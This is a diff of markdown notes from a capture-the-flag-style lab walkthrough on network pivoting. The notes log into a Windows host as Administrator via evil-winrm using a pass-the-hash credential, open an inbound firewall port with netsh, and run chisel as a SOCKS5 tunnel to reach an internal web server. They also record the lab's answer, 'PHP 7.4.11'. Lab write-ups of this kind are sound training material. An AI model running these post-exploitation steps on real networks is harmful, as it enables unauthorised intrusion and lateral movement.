@@ -15,14 +15,14 @@ Whether you choose the recommended option or not, get a pivot up and running!
 
 # Your job
 
-1. Open up a port for pivoting. #Evil-WinRM_shell 
-```
-netsh advfirewall firewall add rule name="Kairos" dir=in action=allow protocol=tcp localport=47000
-```
-
-2. For pivoting, we can use chisel. Run evil-winrm . #Attacking_Machine 
+1. For pivoting, we can use chisel. Run evil-winrm . #Attacking_Machine 
 ```
 evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s <chisel_windows.exe directory>
+```
+
+2. Open up a port for pivoting. #Evil-WinRM_shell 
+```
+netsh advfirewall firewall add rule name="Chisel-exec2" dir=in action=allow protocol=tcp localport=44444
 ```
 
 3. Download  it from https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz/. #Attacking_Machine 
@@ -36,10 +36,10 @@ upload chisel.exe
 
 6. Setup chisel server forward socks proxy on #Evil-WinRM_shell 
 ```
-chisel.exe server -p 49337 --socks5
+./chisel.exe server -p 44444 --socks5
 ```
 
-7. Install chisel on Kali Linux.
+7. Install chisel on Kali Linux. #Attacking_Machine 
 	1. **Download Chisel Binary**
 	    
 	    - Visit the official [Chisel GitHub releases page](https://github.com/jpillora/chisel/releases).
@@ -64,8 +64,25 @@ chisel.exe server -p 49337 --socks5
 
 8. Run chisel client. #Attacking_Machine 
 ```
-chisel client 10.200.84.150:49337 9090:socks
+chisel client 10.200.84.150:44444 9090:socks
 ```
 
 Now the socks proxy is opened on port 9090 of our port
 
+9. Setup FoxyProxy: Ensure you setup a `SOCKS5` proxy with *foxyproxy*:
+	 ![[Pivoting-20250126190740769.webp]]
+
+10. Navigate to http://10.200.X.100.
+	 ![[Pivoting-20250126190906256.webp]]
+
+11. Install wappalyzer extension on your browers and see the results.
+	![[Pivoting-20250126191308575.webp]]
+
+Access the website in your web browser (using FoxyProxy if you used the recommended forward proxy, or directly if you used a port forward).
+
+> [!Question]
+>Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website.
+>`PHP 7.4.11`
+
+
+**Next step: ** [[The Wonders of Git]]
